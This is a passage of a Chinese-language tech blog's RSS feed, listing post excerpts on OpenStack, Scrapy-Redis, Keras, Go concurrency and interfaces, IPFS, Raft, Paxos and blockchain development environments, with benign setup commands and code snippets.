    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; KNOWN_EXCEPTIONS &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; e:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(e)
        fail(e)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>OpenStack源码学习笔记1</title>
      <link>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</link>
      <pubDate>Mon, 16 Sep 2019 17:46:29 +0000</pubDate>
      
      <guid>/posts/openstack%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#%e9%a2%84%e5%a4%87%e7%9f%a5%e8%af%86&#34;&gt;预备知识&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#%e8%99%9a%e6%8b%9f%e5%8c%96&#34;&gt;虚拟化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#wsgi&#34;&gt;WSGI&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#paste-deployment&#34;&gt;Paste Deployment&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%e9%80%9a%e7%94%a8%e5%a5%97%e8%b7%af&#34;&gt;通用套路&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%e9%85%8d%e7%bd%ae%e5%8a%a0%e8%bd%bd%e4%b8%8e%e8%b7%af%e7%94%b1%e7%bb%91%e5%ae%9a&#34;&gt;配置加载与路由绑定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#%e5%88%9b%e5%bb%ba%e8%99%9a%e6%8b%9f%e6%9c%ba&#34;&gt;创建虚拟机&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#nova-api&#34;&gt;Nova-Api&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#nova-conductor-1&#34;&gt;Nova-Conductor-1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#nova-scheduler&#34;&gt;Nova-Scheduler&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#nova-conductor-2&#34;&gt;Nova-Conductor-2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#nova-compute&#34;&gt;Nova-Compute&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作为已经比较成熟的IAAS开源解决方案，OpenStack已经发布了19个版本，目前稳定版是Stein，并且下一个版本Train也预计在10月发布。可以说，从代码架构角度来说对于初学者来说已经略微复杂，但最核心的组件有以下几个：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Nova：负责虚拟机相关。&lt;/li&gt;
&lt;li&gt;Glance：负责镜像相关。&lt;/li&gt;
&lt;li&gt;Cinder：负责存储相关。&lt;/li&gt;
&lt;li&gt;Neutron：负责网络相关。&lt;/li&gt;
&lt;li&gt;Keystone：负责鉴权以及服务注册。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;大体架构如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://mypic-1252424367.cos.ap-hongkong.myqcloud.com/opstack/openstack-arch-kilo-logical-v1.png&#34; alt=&#34;all.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Scrapy-Redis结合POST请求获取数据</title>
      <link>/posts/scrapy-redis%E7%BB%93%E5%90%88post%E8%AF%B7%E6%B1%82%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Mon, 06 May 2019 16:31:37 +0000</pubDate>
      
      <guid>/posts/scrapy-redis%E7%BB%93%E5%90%88post%E8%AF%B7%E6%B1%82%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE/</guid>
      <description>&lt;p&gt;能看到这篇文章的小伙伴肯定已经知道什么是Scrapy以及Scrapy-Redis了，基础概念这里就不再介绍。默认情况下Scrapy-Redis是发送GET请求获取数据的，对于某些使用POST请求的情况需要重写&lt;code&gt;make_request_from_data&lt;/code&gt;函数即可，但奇怪的是居然没在网上搜到简洁明了的答案，或许是太简单了？&lt;/p&gt;
&lt;p&gt;这里我以&lt;code&gt;httpbin.org&lt;/code&gt;这个网站为例，首先在&lt;code&gt;settings.py&lt;/code&gt;中添加所需配置，这里需要根据实际情况进行修改：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;SCHEDULER &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;scrapy_redis.scheduler.Scheduler&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;#启用Redis调度存储请求队列&lt;/span&gt;
SCHEDULER_PERSIST &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; True    &lt;span style=&#34;color:#75715e&#34;&gt;#不清除Redis队列、这样可以暂停/恢复 爬取&lt;/span&gt;
DUPEFILTER_CLASS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;scrapy_redis.dupefilter.RFPDupeFilter&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;#确保所有的爬虫通过Redis去重&lt;/span&gt;
SCHEDULER_QUEUE_CLASS &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scrapy_redis.queue.SpiderPriorityQueue&amp;#39;&lt;/span&gt;
REDIS_URL &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;redis://127.0.0.1:6379&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>提升keras准确率和速度的小tips</title>
      <link>/posts/%E6%8F%90%E5%8D%87keras%E5%87%86%E7%A1%AE%E7%8E%87%E5%92%8C%E9%80%9F%E5%BA%A6%E7%9A%84tips/</link>
      <pubDate>Thu, 14 Mar 2019 17:27:14 +0000</pubDate>
      
      <guid>/posts/%E6%8F%90%E5%8D%87keras%E5%87%86%E7%A1%AE%E7%8E%87%E5%92%8C%E9%80%9F%E5%BA%A6%E7%9A%84tips/</guid>
      <description>&lt;p&gt;这里记录一下对于新手(对,说的就是本人)学习kears框架时用来提升准确率的一些tip,但这里都是&amp;quot;术&amp;quot;的层面,而对于&amp;quot;道&amp;rdquo;,还是要看数学.全文以深度学习界的&amp;quot;hello world&amp;rdquo;-&lt;a href=&#34;http://yann.lecun.com/exdb/mnist/&#34;&gt;手写数字识别&lt;/a&gt;为例.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>如何对Go代码解偶</title>
      <link>/posts/%E5%A6%82%E4%BD%95%E5%AF%B9go%E4%BB%A3%E7%A0%81%E8%A7%A3%E5%81%B6/</link>
      <pubDate>Mon, 11 Feb 2019 11:05:03 +0000</pubDate>
      
      <guid>/posts/%E5%A6%82%E4%BD%95%E5%AF%B9go%E4%BB%A3%E7%A0%81%E8%A7%A3%E5%81%B6/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://www.sage42.org/2019/01/30/how-to-fix-tightly-coupled-go-code/&#34;&gt;原文&lt;/a&gt;，文章作者也是《Hands-On Dependency Injection in Go》的作者，向原作者表示感谢。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;你是否曾经由于添加某个新功能却导致另一个功能出问题？修复好这个，另一个又出问题，就好象打地鼠一般。&lt;/p&gt;
&lt;p&gt;你是否曾经花费大量的时间调试Bug，最后却发现问题潜伏在另一个、甚至毫不相关的模块中？&lt;/p&gt;
&lt;p&gt;这些问题都是由于高耦合引起的。&lt;/p&gt;
&lt;p&gt;在这篇文章中，我们来使用解偶的方式来让代码更加易于理解、维护、测试。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>go get命令使用socket代理</title>
      <link>/posts/go-get%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8socket%E4%BB%A3%E7%90%86/</link>
      <pubDate>Fri, 12 Oct 2018 13:57:35 +0000</pubDate>
      
      <guid>/posts/go-get%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8socket%E4%BB%A3%E7%90%86/</guid>
      <description>&lt;p&gt;由于某些不可描述的原因，国内使用&lt;code&gt;go get&lt;/code&gt;命令安装某些包的时候会超时导致失败，比如&lt;code&gt;net&lt;/code&gt;包、&lt;code&gt;sys&lt;/code&gt;包、&lt;code&gt;tools&lt;/code&gt;包等。第一种解决办法就是自己从git上下载后添加链接到&lt;code&gt;GOPATH&lt;/code&gt;中，比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;git clone https://github.com/golang/net.git $GOPATH/src/github.com/golang/net

git clone https://github.com/golang/sys.git $GOPATH/src/github.com/golang/sys

git clone https://github.com/golang/tools.git $GOPATH/src/github.com/golang/tools

ln -s $GOPATH/src/github.com/golang $GOPATH/src/golang.org/

cd $GOPATH/src/golang.org/  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; mv golang x
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>IPFS初窥3</title>
      <link>/posts/ipfs%E5%88%9D%E7%AA%A53/</link>
      <pubDate>Wed, 10 Oct 2018 15:26:16 +0000</pubDate>
      
      <guid>/posts/ipfs%E5%88%9D%E7%AA%A53/</guid>
      <description>&lt;p&gt;在&lt;a href=&#34;http://www.hi-roy.com/2018/09/19/IPFS%E5%88%9D%E7%AA%A52/&#34;&gt;上一篇文章&lt;/a&gt;中记录到了IPFS的&lt;code&gt;BitSwap&lt;/code&gt;协议，今天接着往下看关于&lt;code&gt;Object&lt;/code&gt;的部分。&lt;/p&gt;
&lt;h2 id=&#34;merkle-dag&#34;&gt;Merkle DAG&lt;/h2&gt;
&lt;p&gt;Merkle DAG是IPFS核心概念之一，在Git的数据结构上进行了改造。理解Merkle DAG之前先来了解下&lt;a href=&#34;https://en.wikipedia.org/wiki/Merkle_tree&#34;&gt;Merkle Tree&lt;/a&gt;。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>IPFS初窥2</title>
      <link>/posts/ipfs%E5%88%9D%E7%AA%A52/</link>
      <pubDate>Wed, 19 Sep 2018 10:52:06 +0000</pubDate>
      
      <guid>/posts/ipfs%E5%88%9D%E7%AA%A52/</guid>
      <description>&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;在&lt;a href=&#34;http://www.hi-roy.com/2018/09/04/IPFS%E5%88%9D%E7%AA%A5/&#34;&gt;上一篇文章&lt;/a&gt;中初步介绍了IPFS的基本概念和使用方法，今天更深入一些了解IPFS的设计理念。&lt;/p&gt;
&lt;p&gt;根据 &lt;strong&gt;第三版&lt;/strong&gt; 白皮书，IPFS体系可以分为7层：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;身份：负责节点的身份生成和认证。&lt;/li&gt;
&lt;li&gt;网络：负责节点间的网络连接，可以配置使用各种网络协议。&lt;/li&gt;
&lt;li&gt;路由：维护路由信息来找出特定的节点和对象。默认使用DHT，可以替换。&lt;/li&gt;
&lt;li&gt;交换：一个新型的块交换协议(BitSwap)来高效管理块分发。有点类似超市，对数据复制有激励。交易策略可以替换。&lt;/li&gt;
&lt;li&gt;对象：带有链接的、内容寻址的不可变对象组成的Merkle DAG，可以代表任意数据结构。比如文件层级和通信系统。&lt;/li&gt;
&lt;li&gt;文件：受到Git启发的版本控制文件层级系统。&lt;/li&gt;
&lt;li&gt;命名：自验证的可变命名系统。&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>IPFS初窥</title>
      <link>/posts/ipfs%E5%88%9D%E7%AA%A5/</link>
      <pubDate>Tue, 04 Sep 2018 10:41:30 +0000</pubDate>
      
      <guid>/posts/ipfs%E5%88%9D%E7%AA%A5/</guid>
      <description>&lt;p&gt;虽然区块链有很多令人兴奋的特性，但是也有其固有的缺点。比如，文件或者长度较长的文本信息就不适合存储在链上。那么如何解决这个缺点呢？一个解决方案就是IPFS(Interplanetary File System)——星际文件系统。&lt;/p&gt;
&lt;p&gt;本文作为简介篇不打算涉及网络及数据结构相关知识(比如什么是协议、什么是树、什么是图……)，不过我相信各位看官既然能找到本文网络基础应该不是问题。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>墨卡托坐标转经纬度</title>
      <link>/posts/%E5%A2%A8%E5%8D%A1%E6%89%98%E5%9D%90%E6%A0%87%E8%BD%AC%E7%BB%8F%E7%BA%AC%E5%BA%A6/</link>
      <pubDate>Mon, 30 Jul 2018 15:52:40 +0000</pubDate>
      
      <guid>/posts/%E5%A2%A8%E5%8D%A1%E6%89%98%E5%9D%90%E6%A0%87%E8%BD%AC%E7%BB%8F%E7%BA%AC%E5%BA%A6/</guid>
      <description>&lt;p&gt;今天获取百度地图数据时候发现其坐标都是类似&lt;code&gt;12945050.96,4826978.52&lt;/code&gt;这种而非常见的经纬度，之前获取百度外面商家信息时就发现了这个问题但没深入研究，搜索后发现这种表示方法叫做&lt;code&gt;墨卡托坐标&lt;/code&gt;。不得不说，关于坐标的标准还真是挺多的，根据经纬度查询位置可以使用&lt;a href=&#34;http://www.gpsspg.com/maps.htm&#34;&gt;这个网站&lt;/a&gt;。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>200行GO代码实现区块链3</title>
      <link>/posts/200%E8%A1%8Cgo%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE3/</link>
      <pubDate>Fri, 22 Jun 2018 17:35:36 +0000</pubDate>
      
      <guid>/posts/200%E8%A1%8Cgo%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE3/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://medium.com/@mycoralhealth/code-your-own-blockchain-mining-algorithm-in-go-82c6a71aba1f&#34;&gt;原文&lt;/a&gt;，阅读之前请先看&lt;a href=&#34;http://www.hi-roy.com/2018/05/18/200%E8%A1%8CGO%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE1/&#34;&gt;200行GO代码实现区块链1&lt;/a&gt; 和 &lt;a href=&#34;http://www.hi-roy.com/2018/05/21/200%E8%A1%8CGO%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%8C%BA%E5%9D%97%E9%93%BE2/&#34;&gt;200行GO代码实现区块链2&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;如果看到这了相信你已经知道什么是加密算法等背景了，所以忽略关于这部分的翻译，直接从编码开始。这篇文章在前两篇的文章基础上添加了工作量证明(POW)挖矿算法。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Hyperledger-Fabric环境搭建笔记</title>
      <link>/posts/hyperledger-fabric%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/</link>
      <pubDate>Fri, 15 Jun 2018 10:43:49 +0000</pubDate>
      
      <guid>/posts/hyperledger-fabric%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/</guid>
      <description>&lt;h2 id=&#34;环境搭建&#34;&gt;环境搭建&lt;/h2&gt;
&lt;p&gt;前提需要电脑中存在&lt;code&gt;git&lt;/code&gt;、&lt;code&gt;docker&lt;/code&gt;、&lt;code&gt;docker-compose&lt;/code&gt;命令以及有&lt;code&gt;golang&lt;/code&gt;开发环境。&lt;/p&gt;
&lt;p&gt;首先创建目录存放Fabric代码，&lt;strong&gt;注意路径和权限&lt;/strong&gt;，在启动服务时候会向其中写一些文件，最开始我就是没注意到这点报错了。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sudo mkdir /opt/gopath/src/github.com/hyperledger/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;进入刚才创建的目录后拉取代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd /opt/gopath/src/github.com/hyperledger
git clone https://github.com/hyperledger/fabric.git
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当前版本是1.1。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>Raft算法</title>
      <link>/posts/raft%E7%AE%97%E6%B3%95/</link>
      <pubDate>Thu, 07 Jun 2018 22:26:33 +0000</pubDate>
      
      <guid>/posts/raft%E7%AE%97%E6%B3%95/</guid>
      <description>&lt;p&gt;相比与Paxos算法，Raft更容易理解。首先推荐个&lt;a href=&#34;http://thesecretlivesofdata.com/raft/&#34;&gt;动画视频&lt;/a&gt; (注意这个动画真的基于raft算法，所以每次选举出的节点都是不同的，我观看某些章节时候甚至出现过3次选举过程)，然后是&lt;a href=&#34;http://www.infoq.com/cn/articles/raft-paper&#34;&gt;raft论文中文版&lt;/a&gt;和&lt;a href=&#34;https://raft.github.io/&#34;&gt;raft主页&lt;/a&gt;，基本结合这3个网站就能理解raft了。&lt;/p&gt;
&lt;p&gt;在Raft算法中，有3种角色：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Leader&lt;/li&gt;
&lt;li&gt;Follower&lt;/li&gt;
&lt;li&gt;Candidate&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;大体分为2个过程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;选举(Leader Election)&lt;/li&gt;
&lt;li&gt;日志同步(Log Replication)&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>GO语言学习笔记-互斥锁</title>
      <link>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%92%E6%96%A5%E9%94%81/</link>
      <pubDate>Thu, 07 Jun 2018 17:42:11 +0000</pubDate>
      
      <guid>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%92%E6%96%A5%E9%94%81/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://golangbot.com/mutex/&#34;&gt;原文&lt;/a&gt;，互斥锁(Mutex)也是go并发系列最后一篇文章。&lt;/p&gt;
&lt;h2 id=&#34;临界区&#34;&gt;临界区&lt;/h2&gt;
&lt;p&gt;在说互斥锁前，理解并发编程中的临界区(Critical section)是十分重要的。当一个程序并发执行时，共享资源不应该在同一时刻被多个goroutine修改。这段修改共享资源的代码就叫做临界区。举个例子，我们有一个代码片段用于修改变量x自增１。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;x = x+1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果上面的代码在唯一的goroutine中执行，不会有任何问题。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>GO语言学习笔记-Select</title>
      <link>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-select/</link>
      <pubDate>Thu, 07 Jun 2018 16:54:28 +0000</pubDate>
      
      <guid>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-select/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://golangbot.com/select/&#34;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;什么是select&#34;&gt;什么是Select&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;select&lt;/code&gt;语法用来从多个读／写的channel中选择一个，如果没有任何channel就绪select语句将被阻塞。如果多个就绪，则随机选择一个。语法和&lt;code&gt;switch&lt;/code&gt;类似，除了case后面跟随的是channel。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>GO语言学习笔记-缓冲区Channels和线程池</title>
      <link>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%BC%93%E5%86%B2%E5%8C%BAchannels%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0/</link>
      <pubDate>Mon, 04 Jun 2018 22:11:55 +0000</pubDate>
      
      <guid>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%BC%93%E5%86%B2%E5%8C%BAchannels%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://golangbot.com/buffered-channels-worker-pools/&#34;&gt;原文&lt;/a&gt;，这里为了方便理解我把worker pools翻译成线程池。&lt;/p&gt;
&lt;h2 id=&#34;什么是缓冲区channel&#34;&gt;什么是缓冲区Channel&lt;/h2&gt;
&lt;p&gt;之前讨论的所有channel都是不带缓冲区的，因此读取和写入都会被阻塞。创建一个带缓冲区的channel也是可能的，这种channel只有在缓冲区满后再写入或者读取一个空的channel时才会被阻塞。&lt;/p&gt;
&lt;p&gt;创建一个带缓冲区的channel需要一个额外的参数容量来表明缓冲区大小：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ch&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make(&lt;span style=&#34;color:#66d9ef&#34;&gt;chan&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;capacity&lt;/span&gt;)  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面代码中的 &lt;em&gt;capacity&lt;/em&gt;　需要大于０，如果等于０的话则是之前学习的无缓冲区channel。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>GO语言学习笔记-Channels</title>
      <link>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-channels/</link>
      <pubDate>Mon, 04 Jun 2018 14:24:51 +0000</pubDate>
      
      <guid>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-channels/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://golangbot.com/channels/&#34;&gt;原文&lt;/a&gt;，建议先看完goroutine部分再看这篇。&lt;/p&gt;
&lt;h2 id=&#34;什么是channels&#34;&gt;什么是channels&lt;/h2&gt;
&lt;p&gt;channels可以理解成是goroutine之间通信的管道，和水流从管道的一端到另一端类似，数据也可以从管道的一端发送另一端接收。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>GO语言学习笔记-Goroutines</title>
      <link>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-goroutines/</link>
      <pubDate>Fri, 01 Jun 2018 11:51:33 +0000</pubDate>
      
      <guid>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-goroutines/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://golangbot.com/goroutines/&#34;&gt;原文&lt;/a&gt;，建议理解并发(concurrency)、并行(parallelism)区别后再看这方面的内容。&lt;/p&gt;
&lt;h2 id=&#34;goroutines是啥&#34;&gt;Goroutines是啥？&lt;/h2&gt;
&lt;p&gt;Goroutines是一个可以和其他函数或方法并发执行的函数或方法。也可以把它理解为轻量级的线程(roy注:这话听起来和大python中的协程很像啊！)，而创建Goroutine的开销却远远小于线程。因此在大多数的Go程序都可以并发执行成千上万的Goroutine。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>BasicPaxos算法</title>
      <link>/posts/basicpaxos%E7%AE%97%E6%B3%95/</link>
      <pubDate>Thu, 31 May 2018 16:08:07 +0000</pubDate>
      
      <guid>/posts/basicpaxos%E7%AE%97%E6%B3%95/</guid>
      <description>&lt;h2 id=&#34;cpa理论&#34;&gt;CPA理论&lt;/h2&gt;
&lt;p&gt;分布式系统中有个经典的CAP理论，就是说任何分布式系统最多满足一致性(Consistency)，可用性(Availability)，分区容错性(Partition Tolerance)这三者中的两个。&lt;/p&gt;
&lt;p&gt;既然是分布式，必然将节点部署到不同的网络中，而这则会引起一致性问题。想解决一致性，就需要保证每次操作所有节点都成功执行，而这又会降低可用性。既然分区已经是事实，所以工程上应该尽量在保证一致性的前提下提高可用性。&lt;/p&gt;
&lt;p&gt;而一致性又可以分为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强一致性：上次写什么，下次就一定能读到什么，这需要牺牲可用性。&lt;/li&gt;
&lt;li&gt;弱一致性：并不保证更新后所有线程都能读到最新值，需要一段时间进行同步。&lt;/li&gt;
&lt;li&gt;最终一致性：弱一致性的一种特例。&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>基于Docker的以太坊开发环境搭建</title>
      <link>/posts/%E5%9F%BA%E4%BA%8Edocker%E7%9A%84%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
      <pubDate>Fri, 25 May 2018 21:06:00 +0000</pubDate>
      
      <guid>/posts/%E5%9F%BA%E4%BA%8Edocker%E7%9A%84%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
      <description>&lt;p&gt;本地开发环境可以使用&lt;code&gt;geth&lt;/code&gt;和&lt;code&gt;testrpc&lt;/code&gt;(已经改名成ganache-cli)2种，如果只是进行测试或者学习智能合约开发的话，建议使用第二个。至于docker怎么安装网上很多这里不再赘述。&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>GO语言学习笔记-接口2</title>
      <link>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8E%A5%E5%8F%A32/</link>
      <pubDate>Tue, 22 May 2018 22:29:47 +0000</pubDate>
      
      <guid>/posts/go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8E%A5%E5%8F%A32/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://golangbot.com/interfaces-part-2/&#34;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;传指针vs传值&#34;&gt;传指针vs传值&lt;/h2&gt;
&lt;p&gt;上篇文章中所有接口实现我们都使用的传值，当然也可以使用传指针这种方式来实现接口。但使用传指针这种方式有一点需要注意，我们来看下面这个代码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Describer&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt; {  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;Describe&lt;/span&gt;()
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Describe&lt;/span&gt;() { &lt;span style=&#34;color:#75715e&#34;&gt;//implemented using value receiver  
